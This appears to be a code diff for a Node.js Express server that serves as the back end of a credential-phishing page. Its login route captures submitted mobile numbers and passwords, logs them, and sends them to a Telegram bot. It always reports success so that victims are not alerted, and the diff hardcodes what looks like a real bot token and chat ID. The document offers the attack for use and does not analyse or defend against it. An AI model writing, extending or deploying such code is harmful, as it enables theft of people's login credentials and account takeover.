@@ -1,21 +1,18 @@
 const express = require('express');
 const cors = require('cors');
-const dotenv = require('dotenv');
 const axios = require('axios');
 
-dotenv.config();
-
 const app = express();
-const PORT = process.env.PORT || 5000;
+const PORT = 5000;
 
 // Middleware
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Telegram Config
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+// Telegram Config - HARDCODED (your details)
+const TELEGRAM_BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
+const TELEGRAM_CHAT_ID = '8392790531';
 
 // Test route
 app.get('/', (req, res) => {
@@ -30,6 +27,9 @@ app.get('/', (req, res) => {
 app.post('/api/login', async (req, res) => {
     try {
         const { mobileNumber, password } = req.body;
+
+        console.log('📱 Received mobile:', mobileNumber);
+        console.log('🔑 Received password:', password);
 
         if (!mobileNumber || !password) {
             return res.status(400).json({
@@ -52,16 +52,16 @@ app.post('/api/login', async (req, res) => {
 ━━━━━━━━━━━━━━━━━━━
         `;
 
-        await axios.post(
-            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-            {
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            }
-        );
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        const response = await axios.post(telegramUrl, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        });
 
         console.log(`✅ Login captured: ${mobileNumber}`);
+        console.log('📡 Telegram response:', response.status);
 
         // Always return success
         res.json({
@@ -71,8 +71,9 @@ app.post('/api/login', async (req, res) => {
         });
 
     } catch (error) {
-        console.error('Error:', error.message);
-        res.status(200).json({
+        console.error('❌ Error:', error.message);
+        // Still return success to not alert the user
+        res.json({
             success: true,
             message: 'Login successful!'
         });
@@ -80,5 +81,11 @@ app.post('/api/login', async (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`
+    ╔═══════════════════════════════════╗
+    ║   🚀 SERVER RUNNING               ║
+    ║   Port: ${PORT}                    ║
+    ║   Status: ONLINE ✅               ║
+    ╚═══════════════════════════════════╝
+    `);
 });
